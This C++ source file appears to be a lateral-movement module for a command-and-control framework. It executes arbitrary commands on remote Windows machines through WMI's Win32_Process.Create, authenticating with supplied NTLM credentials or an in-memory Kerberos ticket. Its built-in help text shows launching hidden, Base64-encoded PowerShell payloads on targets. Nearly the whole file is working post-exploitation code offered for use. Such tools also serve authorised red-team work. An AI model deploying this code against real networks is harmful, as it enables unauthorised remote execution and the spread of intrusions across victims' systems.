#include "WmiExec.hpp"

#include <cstring>
#include  <algorithm>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "wmiExec";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) WmiExec* WmiExecConstructor() 
{
    return new WmiExec();
}

#else

__attribute__((visibility("default"))) WmiExec* WmiExecConstructor() 
{
    return new WmiExec();
}

#endif


WmiExec::WmiExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}


WmiExec::~WmiExec()
{
}


std::string WmiExec::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "WmiExec Module:\n";
    info += "Execute a remote command using Windows Management Instrumentation (WMI).\n";
    info += "Administrator privileges on the remote machine are required.\n";
    info += "Supports both credential-based and Kerberos authentication.\n";
    info += "For Kerberos authentication, ensure a valid ticket is already loaded in memory (e.g., via Rubeus).\n";
    info += "\nUsage examples:\n";
    info += " - wmiExec -u DOMAIN\\Username Password DOMAIN\\dc powershell.exe -nop -w hidden -e <Base64Payload>\n";
    info += " - wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e <Base64Payload>\n";
    info += "\nOptions:\n";
    info += " -u <user> <password> <target>  Use username and password authentication\n";
    info += " -k <dc> <target>               Use Kerberos authentication (ticket must be in memory)\n";
    info += " -n localhost                   No password localhost\n";
    info += "\nNote:\n";
    info += " The command and arguments following the target are passed to the remote process.\n";
#endif
    return info;
}


int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
   if (splitedCmd.size() >= 2)
   {
        string mode = splitedCmd[1];

        if(mode=="-u" && splitedCmd.size() >= 6)
        {
            string usernameDomain=splitedCmd[2];
            string password=splitedCmd[3];
            string target=splitedCmd[4];
            std::string username="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(usernameDomain, "\\", splitedList);

            if(splitedList.size()==1)
                username = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                username = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += username;
            cmd += '\0';
            cmd += password;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 5; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else if(mode=="-k" && splitedCmd.size() >= 5)
        {
            string dcDomain=splitedCmd[2];
            string target=splitedCmd[3];
            std::string dc="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(dcDomain, "\\", splitedList);

            if(splitedList.size()==1)
                dc = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                dc = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += dc;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 4; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else if(mode=="-n" && splitedCmd.size() >= 4)
        {
            string target=splitedCmd[2];
            std::string cmd = target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 3; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }

        c2Message.set_instruction(splitedCmd[0]);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}


int WmiExec::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
    c2RetMessage.set_cmd(cmd); 
    
    int error=0;
    std::string result;

#ifdef _WIN32
    error = execute(c2Message, result);
#else
    result = "Only supported on Windows.\n";
#endif
    
    if(error)
        c2RetMessage.set_errorCode(error);

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);

    return 0;
}


#define ERROR_SUCCESS                         0
#define ERROR_COINITIALIZE_FAILED             1
#define ERROR_COINITIALIZE_SECURITY_FAILED    2
#define ERROR_CREATE_LOCATOR_FAILED           3
#define ERROR_CONNECT_SERVER_FAILED           4
#define ERROR_SET_PROXY_BLANKET_FAILED        5
#define ERROR_GET_OBJECT_FAILED               6
#define ERROR_GET_METHOD_FAILED               7
#define ERROR_SPAWN_INSTANCE_FAILED           8
#define ERROR_PUT_COMMAND_FAILED              9
#define ERROR_EXEC_METHOD_FAILED              10
#define ERROR_LINUX_UNSUPPORTED               100


int WmiExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}


#ifdef _WIN32

// https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--calling-a-provider-method
// https://vimalshekar.github.io/codesamples/Launching-a-process-on-remote-machine
int WmiExec::execute(C2Message &c2Message, std::string& result) const
{
    std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    std::string delimitator(1, '\0');
    splitList(cmd, delimitator, splitedList);

    bool useToken = false;
    bool useNTLM = false;
    std::string authority, target, domainName, userName, user, password;

    if (splitedList.size() == 4)
    {
        useNTLM = true;
        domainName = splitedList[0];
        userName = splitedList[1];
        password = splitedList[2];
        target   = splitedList[3];
        user     = domainName + "\\" + userName;
    }
    else if (splitedList.size() == 3)
    {
        useToken = true;
        domainName = splitedList[0];
        std::string dc = splitedList[1];
        target = splitedList[2];
        authority = "kerberos:" + domainName + "\\" + dc;
    }
    else if (splitedList.size() == 1)
    {
        target = splitedList[0];
    }

    const std::string data = c2Message.data();

    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        return ERROR_COINITIALIZE_FAILED;
    }

    hres = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IDENTIFY,
        NULL,
        EOAC_NONE,
        NULL
    );

    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        CoUninitialize();
        return ERROR_COINITIALIZE_SECURITY_FAILED;
    }

    IWbemLocator* pLoc = nullptr;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                            IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres))
    {
        result = std::to_string(GetLastError());
        CoUninitialize();
        return ERROR_CREATE_LOCATOR_FAILED;
    }

    std::string wmiPath = "\\\\" + target + "\\root\\CIMV2";

    IWbemServices* pSvc = nullptr;

    if(useToken || useNTLM)
    {
        hres = pLoc->ConnectServer(
            _bstr_t(wmiPath.c_str()),
            _bstr_t(useToken ? NULL : user.c_str()),
            _bstr_t(useToken ? NULL : password.c_str()),
            NULL, 0L,
            _bstr_t(useNTLM ? NULL : authority.c_str()),
            0, &pSvc);
    }
    else
    {
        hres = pLoc->ConnectServer(
            _bstr_t(L"ROOT\\CIMV2"),
            NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    }

    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        pLoc->Release();
        CoUninitialize();
        return ERROR_CONNECT_SERVER_FAILED;
    }

    SEC_WINNT_AUTH_IDENTITY_A* pAuthIdentity = nullptr;
    if (useNTLM)
    {
        pAuthIdentity = new SEC_WINNT_AUTH_IDENTITY_A;
        ZeroMemory(pAuthIdentity, sizeof(SEC_WINNT_AUTH_IDENTITY_A));

        pAuthIdentity->User = (unsigned char*)userName.data();
        pAuthIdentity->UserLength = (ULONG)userName.size();
        pAuthIdentity->Domain = (unsigned char*)domainName.data();
        pAuthIdentity->DomainLength = (ULONG)domainName.size();
        pAuthIdentity->Password = (unsigned char*)password.data();
        pAuthIdentity->PasswordLength = (ULONG)password.size();
        pAuthIdentity->Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
    }

    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        pAuthIdentity,
        EOAC_NONE
    );

    if (useNTLM)
        delete pAuthIdentity;

    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return ERROR_SET_PROXY_BLANKET_FAILED;
    }

    BSTR MethodName = SysAllocString(L"Create");
    BSTR ClassName  = SysAllocString(L"Win32_Process");

    IWbemClassObject* pClass = nullptr;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);
    if (FAILED(hres))
    {
        result = std::to_string((long)hres);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pSvc->Release(); pLoc->Release(); CoUninitialize();
        return ERROR_GET_OBJECT_FAILED;
    }

    IWbemClassObject* pInParamsDefinition = nullptr;
    hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);
    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release(); pSvc->Release(); pLoc->Release(); CoUninitialize();
        return ERROR_GET_METHOD_FAILED;
    }

    IWbemClassObject* pClassInstance = nullptr;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pInParamsDefinition->Release(); pClass->Release(); pSvc->Release(); pLoc->Release(); CoUninitialize();
        return ERROR_SPAWN_INSTANCE_FAILED;
    }

    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(data.c_str());

    hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClassInstance->Release(); pInParamsDefinition->Release(); pClass->Release();
        pSvc->Release(); pLoc->Release(); CoUninitialize();
        return ERROR_PUT_COMMAND_FAILED;
    }

    IWbemClassObject* pOutParams = nullptr;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);
    if (FAILED(hres))
    {
        _com_error err(hres);
        result = std::string(err.ErrorMessage());
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClassInstance->Release(); pInParamsDefinition->Release(); pClass->Release();
        pSvc->Release(); pLoc->Release(); CoUninitialize();
        return ERROR_EXEC_METHOD_FAILED;
    }

    VARIANT varReturnValue;
    VariantInit(&varReturnValue);
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);

    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    result = "Success.";
    return ERROR_SUCCESS;
}

#endif
